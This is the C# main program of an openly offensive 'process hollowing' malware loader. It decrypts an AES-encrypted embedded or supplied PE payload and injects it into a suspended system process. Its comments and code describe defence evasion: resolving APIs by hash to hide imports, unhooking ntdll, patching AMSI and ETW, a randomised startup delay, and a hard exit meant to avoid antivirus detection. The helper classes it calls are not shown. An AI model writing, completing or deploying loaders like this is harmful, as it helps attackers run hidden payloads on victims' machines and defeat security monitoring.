using System;
using System.IO;
using System.Runtime.InteropServices;

namespace HollowLoader
{
    /// <summary>
    /// Evasive AES-encrypted process hollowing loader.
    ///
    /// Usage:
    ///   HollowLoader.exe                    (use embedded Payload.cs)
    ///   HollowLoader.exe --payload blob.bin (encrypted blob: key(32)||iv(16)||ct)
    ///   HollowLoader.exe --process calc.exe
    ///   HollowLoader.exe --args "-k netsvcs"
    ///   HollowLoader.exe --debug
    ///
    /// Execution chain:
    ///   resolve APIs by hash (PEB walk) -> unhook ntdll / patch AMSI+ETW ->
    ///   AES-256-CBC decrypt -> map PE into suspended sacrificial process ->
    ///   resume. No payload or API-name strings exist in plaintext in the file.
    /// </summary>
    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            string payloadFile = null;
            string target = Config.DefaultTarget;
            string targetArgs = "";
            bool debug = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "--payload": if (i + 1 < args.Length) payloadFile = args[++i]; break;
                    case "--process": if (i + 1 < args.Length) target = args[++i]; break;
                    case "--args": if (i + 1 < args.Length) targetArgs = args[++i]; break;
                    case "--debug": debug = true; break;
                }
            }

            if (Config.StartupDelayMs > 0)
                System.Threading.Thread.Sleep(Config.StartupDelayMs + new Random().Next(0, 1500));

            // 1. Resolve every API by hash — no sensitive imports/strings
            Win32 api = Win32.Resolve();
            if (api == null)
            {
                Evasion.Log(debug, "[!] API resolution failed");
                return;
            }

            // 2. Evasion layers
            Evasion.Apply(api, debug);

            // 3. Obtain and decrypt the payload
            byte[] ciphertext;
            byte[] key;
            byte[] iv;
            if (payloadFile != null && File.Exists(payloadFile))
            {
                byte[] blob = File.ReadAllBytes(payloadFile);
                if (blob.Length < 48)
                {
                    Evasion.Log(debug, "[!] payload blob too small");
                    return;
                }
                key = new byte[32];
                iv = new byte[16];
                Buffer.BlockCopy(blob, 0, key, 0, 32);
                Buffer.BlockCopy(blob, 32, iv, 0, 16);
                ciphertext = new byte[blob.Length - 48];
                Buffer.BlockCopy(blob, 48, ciphertext, 0, ciphertext.Length);
            }
            else
            {
                ciphertext = Payload.Encrypted;
                key = Crypto.Unmask(Payload.Key);
                iv = Crypto.Unmask(Payload.Iv);
            }

            byte[] rawPe;
            try
            {
                rawPe = Crypto.AesDecrypt(ciphertext, key, iv);
            }
            catch (Exception ex)
            {
                Evasion.Log(debug, "[!] AES decrypt failed: " + ex.Message);
                return;
            }
            Evasion.Log(debug, "[*] decrypted " + rawPe.Length + " bytes");

            // 4. Hollow the sacrificial process
            string targetPath = Path.Combine(Environment.SystemDirectory, target);
            if (Path.IsPathRooted(target)) targetPath = target;

            bool ok = Hollowing.Run(api, rawPe, targetPath, targetArgs, debug);
            if (!ok)
            {
                Evasion.Log(debug, "[!] hollowing failed");
                return;
            }

            // Terminate hard: skip CLR shutdown / finalizers that could trip AV
            Environment.Exit(0);
        }
    }
}
